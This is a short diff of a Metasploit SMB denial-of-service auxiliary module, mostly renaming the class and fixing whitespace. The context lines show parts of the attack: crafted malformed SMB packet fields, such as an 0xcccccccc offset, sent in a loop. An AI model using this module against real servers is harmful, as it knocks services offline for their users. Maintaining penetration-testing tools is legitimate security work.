@@ -1,10 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SMB::Client
   include Msf::Auxiliary::Dos
 
@@ -90,7 +89,7 @@ class Metasploit3 < Msf::Auxiliary
     pkt['Payload'].v['DataLenLow'] = dlenlow #<==================
     pkt['Payload'].v['DataOffset'] = doffset #<====
     pkt['Payload'].v['DataOffsetHigh'] = 0xcccccccc #<====
-    pkt['Payload'].v['ByteCount'] = fillersize#<====
+    pkt['Payload'].v['ByteCount'] = fillersize #<====
     pkt['Payload'].v['Payload'] = filler
 
     simple.client.smb_send(pkt.to_s)
@@ -115,5 +114,4 @@ class Metasploit3 < Msf::Auxiliary
       j=j-10000
     end
   end
-
 end
